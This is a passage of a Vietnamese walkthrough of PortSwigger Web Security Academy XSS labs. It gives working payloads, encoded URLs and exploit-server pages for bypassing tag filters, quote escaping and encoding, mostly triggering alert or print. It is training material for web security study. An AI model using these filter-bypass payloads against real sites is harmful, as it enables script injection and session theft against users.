+<p>Từ đó xác định được source và sink có lỗi. Thực hiện truyền payload sau và alert thành công. Hoàn thành giải lab</p>
+<ul>
+<li>Source: param <code>body</code> , <code>name</code></li>
+<li>Sink: chức năng xem comment do không escape đúng</li>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&lt;&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="w"> </span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2043.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked"><strong>Lab: Reflected XSS into HTML context with most tags and attributes blocked</strong><a class="headerlink" href="#lab-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked | Web Security Academy</a></p>
+<ul>
+<li>Em xem solution chỗ làm sau để cho web tự động resize ạ</li>
+<li>
+<p>Điều hướng đến chức năng <code>Search</code> và thực hiện tìm kiếm. Nhận thấy có waf chặn không cho dùng các thẻ như <code>img</code> …</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2044.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, sau khi fuzz thì nhận được tag <code>&lt;body&gt;</code> cùng với event <code>onresize()</code> không bị chặn.</p>
+</li>
+<li>
+<p>Để thực hiện onresize một cách tự động, chúng ta có thể để iframe load web và vì chúng ta có thể đổi được size của iframe nên body ở trong cũng bị đổi theo. Thực hiện config exploit server như sau và gửi cho victim</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Header</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">var</span><span class="w"> </span><span class="nx">abc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">iframe</span><span class="p">){</span>
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;100px&quot;</span><span class="p">;</span>
+<span class="p">};</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span><span class="w">  </span><span class="na">src</span><span class="o">=</span><span class="s">&quot;&lt;vuln-web&gt;/?search=&lt;body%20onresize=print()&gt;&quot;</span><span class="w">  </span><span class="na">onload</span><span class="o">=</span><span class="s">&quot;abc(this)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện view exploit, nhận thấy print thành công</p>
+<p><img alt="image.png" src="image%2045.png" /></p>
+</li>
+<li>
+<p>Thực hiện gửi cho victim và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2046.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones"><strong>Lab: Reflected XSS into HTML context with all tags blocked except custom ones</strong><a class="headerlink" href="#lab-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked">Lab: Reflected XSS into HTML context with all tags blocked except custom ones | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện điều hướng đến chức năng <code>Search</code> . Tại đây khi truyền vào payload thì nhận thấy một số tag bị chặn, nhưng một tag là <code>&lt;xss&gt;</code> thì không. Ngoài ra, mọi event đều dùng được</li>
+<li>
+<p>Chúng ta cần phải giúp cho thẻ <code>&lt;xss&gt;</code> này có thể focus được vì thẻ này không tự thân nó được nhận được focus ⇒ cần dùng <code>tabIndex</code> . Sau đó, cần focus vào nó bằng cách dùng hash. Cuối cùng ra được payload như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">xss</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="s">&quot;xxx&quot;</span><span class="w"> </span><span class="na">onfocus</span><span class="o">=</span><span class="s">&quot;alert(document.cookie)&quot;</span><span class="w"> </span><span class="na">this.tabIndex</span><span class="err">=</span><span class="na">1</span><span class="p">&gt;</span><span class="nx">aaaaaa</span><span class="p">&lt;/</span><span class="nt">xss</span><span class="p">&gt;</span><span class="n">#xxx</span>
+</code></pre></div>
+</li>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">vuln</span><span class="err">-</span><span class="na">lab</span><span class="w"> </span><span class="na">url</span><span class="p">&gt;</span><span class="o">/?</span><span class="nx">search</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">xss</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="s">&quot;xxx&quot;</span><span class="w"> </span><span class="na">onfocus</span><span class="o">=</span><span class="s">&quot;alert(document.cookie)&quot;</span><span class="w"> </span><span class="na">this.tabIndex</span><span class="err">=</span><span class="na">1</span><span class="p">&gt;</span><span class="nx">aaaaaa</span><span class="p">&lt;/</span><span class="nt">xss</span><span class="p">&gt;</span><span class="n">#xxx</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Để gửi cho victim, chúng ta làm như sau:</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Header</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">location</span><span class="o">=</span><span class="s2">&quot;https://0ac500f2047a3c7a85f9648b001d00c9.web-security-academy.net/?search=%3Cxss%20id=%22xxx%22%20onfocus=%22alert(document.cookie)%22%20tabIndex=1%20%3Eaaaaaa%3C/xss%3E#xxx&quot;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Full config</p>
+<p><img alt="image.png" src="image%2047.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện view exploit và alert thành công</p>
+<p><img alt="image.png" src="image%2048.png" /></p>
+</li>
+<li>
+<p>Gửi victim và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2049.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-with-some-svg-markup-allowed"><strong>Lab: Reflected XSS with some SVG markup allowed</strong><a class="headerlink" href="#lab-reflected-xss-with-some-svg-markup-allowed" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed">Lab: Reflected XSS with some SVG markup allowed | Web Security Academy</a></p>
+<ul>
+<li>Thực hiện điều hướng đến chức năng <code>Search</code> . Quan sát chức năng này đã chặn các thẻ html, tuy nhiên vẫn dùng được thẻ <code>&lt;svg&gt;</code>, <code>&lt;image&gt;</code> và event <code>onbegin</code></li>
+<li>
+<p>Chain các thẻ lại được payload sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">height</span><span class="o">=</span><span class="s">&quot;300&quot;</span><span class="w"> </span><span class="na">viewBox</span><span class="o">=</span><span class="s">&quot;0 0 300 300&quot;</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="c">&lt;!--</span><span class="w"> </span><span class="nx">Image</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">animate</span><span class="w"> </span><span class="o">--&gt;</span>
+<span class="w">  </span><span class="p">&lt;</span><span class="nt">image</span><span class="w"> </span><span class="na">id</span><span class="o">=</span><span class="s">&quot;myImage&quot;</span><span class="w"> </span><span class="na">href</span><span class="o">=</span><span class="s">&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/PNG_transparency_demonstration_1.png/200px-PNG_transparency_demonstration_1.png&quot;</span>
+<span class="w">         </span><span class="na">x</span><span class="o">=</span><span class="s">&quot;50&quot;</span><span class="w"> </span><span class="na">y</span><span class="o">=</span><span class="s">&quot;50&quot;</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s">&quot;200&quot;</span><span class="w"> </span><span class="na">height</span><span class="o">=</span><span class="s">&quot;200&quot;</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="c">&lt;!--</span><span class="w"> </span><span class="nx">Animate</span><span class="w"> </span><span class="nx">rotation</span><span class="w"> </span><span class="nx">around</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">center</span><span class="w"> </span><span class="o">--&gt;</span>
+<span class="w">    </span><span class="p">&lt;</span><span class="nt">animateTransform</span>
+<span class="w">      </span><span class="na">attributeName</span><span class="o">=</span><span class="s">&quot;transform&quot;</span>
+<span class="w">      </span><span class="na">attributeType</span><span class="o">=</span><span class="s">&quot;XML&quot;</span>
+<span class="w">      </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;rotate&quot;</span>
+<span class="w">      </span><span class="na">from</span><span class="o">=</span><span class="s">&quot;0 150 150&quot;</span>
+<span class="w">      </span><span class="na">to</span><span class="o">=</span><span class="s">&quot;360 150 150&quot;</span>
+<span class="w">      </span><span class="na">dur</span><span class="o">=</span><span class="s">&quot;4s&quot;</span>
+<span class="w">      </span><span class="na">repeatCount</span><span class="o">=</span><span class="s">&quot;indefinite&quot;</span>
+<span class="w">      </span><span class="na">onbegin</span><span class="o">=</span><span class="s">&quot;alert(1)&quot;</span><span class="w"> </span><span class="p">/&gt;</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">image</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>URL: thực hiện bỏ khoảng trống và xuống dòng vì path không được quá dài</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">vuln</span><span class="err">-</span><span class="na">web</span><span class="w"> </span><span class="na">url</span><span class="p">&gt;</span><span class="o">/?</span><span class="nx">search</span><span class="o">=%</span><span class="mf">3</span><span class="nx">Csvg</span><span class="o">%</span><span class="mf">20</span><span class="nx">width</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22300</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">height</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22300</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">viewBox</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">220</span><span class="o">%</span><span class="mf">200</span><span class="o">%</span><span class="mf">20300</span><span class="o">%</span><span class="mf">20300</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">3</span><span class="nx">Cimage</span><span class="o">%</span><span class="mf">20</span><span class="nx">id</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">myImage</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">href</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">https</span><span class="o">%</span><span class="mf">3</span><span class="nx">a</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">2</span><span class="nx">fupload</span><span class="p">.</span><span class="nx">wikimedia</span><span class="p">.</span><span class="nx">org</span><span class="o">%</span><span class="mf">2</span><span class="nx">fwikipedia</span><span class="o">%</span><span class="mf">2</span><span class="nx">fcommons</span><span class="o">%</span><span class="mf">2</span><span class="nx">fthumb</span><span class="o">%</span><span class="mf">2</span><span class="nx">f4</span><span class="o">%</span><span class="mf">2</span><span class="nx">f47</span><span class="o">%</span><span class="mf">2</span><span class="nx">fPNG_transparency_demonstration_1</span><span class="p">.</span><span class="nx">png</span><span class="o">%</span><span class="mf">2</span><span class="nx">f200px</span><span class="o">-</span><span class="nx">PNG_transparency_demonstration_1</span><span class="p">.</span><span class="nx">png</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">x</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">2250</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">y</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">2250</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">width</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22200</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">height</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22200</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">3</span><span class="nx">CanimateTransform</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">attributeName</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">transform</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">attributeType</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">XML</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">type</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">rotate</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">from</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">220</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">to</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22360</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">dur</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">224</span><span class="nx">s</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">repeatCount</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">indefinite</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">onbegin</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">C</span><span class="o">%</span><span class="mf">2</span><span class="nx">fimage</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">3</span><span class="nx">C</span><span class="o">%</span><span class="mf">2</span><span class="nx">fsvg</span><span class="o">%</span><span class="mf">3</span><span class="nx">EteName</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">transform</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">attributeType</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">XML</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">type</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">rotate</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">from</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">220</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">to</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22360</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">20150</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">20</span><span class="nx">dur</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">224</span><span class="nx">s</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">begin</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">click</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">repeatCount</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">indefinite</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="nx">onbegin</span><span class="o">%</span><span class="mf">3</span><span class="nx">d</span><span class="o">%</span><span class="mf">22</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">%</span><span class="mf">22</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">2</span><span class="nx">f</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">3</span><span class="nx">C</span><span class="o">%</span><span class="mf">2</span><span class="nx">fimage</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span><span class="o">%</span><span class="mf">20</span><span class="o">%</span><span class="mf">3</span><span class="nx">C</span><span class="o">%</span><span class="mf">2</span><span class="nx">fsvg</span><span class="o">%</span><span class="mf">3</span><span class="nx">E</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi URL. Nhận thấy alert thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2050.png" /></p>
+<p><img alt="image.png" src="image%2051.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-in-canonical-link-tag"><strong>Lab: Reflected XSS in canonical link tag</strong><a class="headerlink" href="#lab-reflected-xss-in-canonical-link-tag" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag">Lab: Reflected XSS in canonical link tag | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện view source. Quan sát thấy có tag sau lấy path vào trong attribute <code>href</code></p>
+<p><img alt="image.png" src="image%2052.png" /></p>
+</li>
+<li>
+<p>Thực hiện escape khỏi dấu <code>'</code> và vì chúng ta có thể dùng phím tắt nên là thêm thuộc tính <code>accesskey</code> cũng như là event <code>onclick</code> để alert</p>
+</li>
+<li>
+<p>Thực hiện gửi payload sau</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">abc</span><span class="o">=</span><span class="nx">xxx</span><span class="o">%</span><span class="mf">27</span><span class="nx">accesskey</span><span class="o">=%</span><span class="mf">27</span><span class="nx">x</span><span class="o">%</span><span class="mf">27</span><span class="nx">onclick</span><span class="o">=%</span><span class="mf">27</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>URL</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">vuln</span><span class="err">-</span><span class="na">lab</span><span class="p">&gt;</span><span class="o">/?</span><span class="nx">abc</span><span class="o">=</span><span class="nx">xxx</span><span class="o">%</span><span class="mf">27</span><span class="nx">accesskey</span><span class="o">=%</span><span class="mf">27</span><span class="nx">x</span><span class="o">%</span><span class="mf">27</span><span class="nx">onclick</span><span class="o">=%</span><span class="mf">27</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Ở đây, nếu chúng ta truyền khoảng trắng thì cũng bị lỗi vì nó sẽ encode <code>%20</code></p>
+</li>
+<li>
+<p>Gửi payload, nhấn phím tắt và alert thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2053.png" /></p>
+<p><img alt="image.png" src="image%2054.png" /></p>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped"><strong>Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</strong><a class="headerlink" href="#lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped">Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>search</code> . Tại đây, thực hiện chèn payload <code>'"&gt;&lt;img src=x onerror=alert(1)&gt;</code> . Quan sát trong response, nhận thấy payload đã bị encode các dấu <code>&lt;&gt;"</code> , tuy nhiên ở dưới lại có phần code js đọc lại payload</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2055.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Chúng ta thấy rằng có thể kiểm soát <code>searchTerms</code> tuy nhiên thì serachTerms bị encode url thì không thể có khả năng thực thi rồi. Còn lại, chúng ta có thể kết thúc script sớm → có thể tự viết thẻ script mới, hoặc img … để chạy js. Thực hiện dùng payload sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onerror</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2056.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped"><strong>Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</strong><a class="headerlink" href="#lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped">Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Search</code> .</p>
+<p><img alt="image.png" src="image%2057.png" /></p>
+</li>
+<li>
+<p>Thực hiện chèn payload sau và nhận thấy các ký tự <code>&lt;&gt;"</code> đã bị encode. Còn khi truyền <code>'</code> thì trong js đã thực hiện escape bằng dấu <code>\</code></p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="err">&#39;&quot;</span><span class="o">&gt;</span><span class="p">&lt;</span><span class="nt">img</span><span class="w"> </span><span class="na">src</span><span class="o">=</span><span class="na">x</span><span class="w"> </span><span class="na">onload</span><span class="o">=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2058.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Như vậy, chúng ta chỉ còn cách khai thác tiếp từ trong js. Ở đây, chúng ta bổ sung <code>\</code> để escape dấu escape. Ngoài ra vì dấu <code>;</code> không bị encode nên có thể dùng để ngắt lệnh. Và sử dụng thêm <code>//</code> để comment đoạn code còn lại. Từ đó suy ra được đoạn payload sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">abc</span><span class="err">\&#39;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span><span class="c1">//</span>
+</code></pre></div>
+</li>
+<li>
+<p>Kết quả</p>
+<p><img alt="image.png" src="image%2059.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện alert thành công và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2060.png" /></p>
+<p><img alt="image.png" src="image%2061.png" /></p>
+</li>
+</ul>
+<h1 id="lab-stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped"><strong>Lab: Stored XSS into <code>onclick</code> event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</strong><a class="headerlink" href="#lab-stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped">Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | Web Security Academy</a></p>
+<ul>
+<li>Em xem solution chỗ ý tưởng escape các dấu <code>\'</code> ạ</li>
+<li>
+<p>Thực hiện truy cập vào một bài post. Tại đây, thực hiện comment với payload sau thì nhận thấy với ký tự <code>&lt;&gt;</code> thì đã bị encode trong html còn trong js các dấu như <code>\'</code> đã bị escape</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2062.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tuy nhiên, việc encode hay escape là do phía server thực hiện, tức là trên browser sẽ không thực hiện escape ⇒ browser parse HTML encoded nhưng lại không thực hiện escape các dấu sau khi encode ⇒ có thể thoát ra <code>'</code> và chèn lệnh</p>
+</li>
+<li>
+<p>Thực hiện sử dụng payload sau</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code><span class="nx">http</span><span class="o">:</span><span class="c1">//a.com&amp;apos;;alert(document.domain)//;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">post</span><span class="o">/</span><span class="nx">comment</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a3200a704c12b53810f2a84005a0014</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
